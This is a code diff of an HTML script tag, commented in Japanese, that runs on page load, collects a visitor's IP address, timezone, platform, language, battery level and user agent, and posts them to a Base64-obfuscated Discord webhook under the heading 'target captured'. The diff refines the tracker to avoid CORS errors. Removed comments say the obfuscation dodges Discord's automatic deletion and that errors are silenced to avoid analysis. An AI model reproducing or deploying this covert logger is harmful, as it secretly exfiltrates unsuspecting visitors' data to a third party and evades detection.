@@ -1,44 +1,43 @@
 <script type="text/javascript">
 (async function() {
     try {
-        // Webhook URLをBase64で隠蔽（Discordボットによる自動削除対策）
+        // 1. Webhook URL (Base64)
         const _0x1f2e = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MDg1ODk1OTE0ODQ4NjY5OC9yb2dSQWpFSlY0VUJQTlB1cTZ2Q1MxbUk0NEM3N3c3NzFXZEI3UldxaDY5NkxLOUlPUDY1NFNzZlQxeZlWEpWRjg3";
         const _0x5a12 = atob(_0x1f2e);
 
-        // 1. IPアドレスと位置情報の取得
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const d = await ipRes.json();
+        // 2. IP取得 (CORSエラーが出にくい ipify を使用)
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const userIP = ipData.ip;
 
-        // 2. 拡張デバイス情報の収集
+        // 3. デバイス情報の収集
         const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const vpn = (tz !== d.timezone) ? "⚠️ VPN/Proxy 検出" : "REAL IP";
-        
-        let bat = "N/A";
+        let bat = "不明";
         try { const b = await navigator.getBattery(); bat = (b.level * 100) + "%"; } catch(e){}
 
-        // 3. Discord用ペイロードの構築
+        // 4. Discord用メッセージ
         const payload = {
             embeds: [{
-                title: "💀 TARGET LOGGED",
-                color: 16711680, // 赤色
+                title: "🚨 ターゲット捕捉 (CORS回避済み)",
+                color: 16711680,
                 fields: [
-                    { name: "🌐 Network", value: `**IP:** ${d.ip}\n**VPN:** ${vpn}\n**ISP:** ${d.org}\n**Loc:** ${d.city}, ${d.country_name}`, inline: false },
-                    { name: "💻 Device", value: `**OS:** ${navigator.platform}\n**Core:** ${navigator.hardwareConcurrency}\n**Bat:** ${bat}\n**Lang:** ${navigator.language}`, inline: true },
-                    { name: "🔍 Browser", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                    { name: "🌐 Network", value: `**IP:** ${userIP}\n**TimeZone:** ${tz}`, inline: false },
+                    { name: "💻 Device", value: `**OS:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Battery:** ${bat}`, inline: true },
+                    { name: "🔍 User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                 ],
-                footer: { text: "ADLOL Tracking System" },
                 timestamp: new Date()
             }]
         };
 
-        // 4. 送信実行
+        // 5. 送信
         await fetch(_0x5a12, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
+
     } catch (err) {
-        // エラー時は静かに終了（解析を避けるため）
+        // エラー時は何もしない
     }
 })();
 </script>
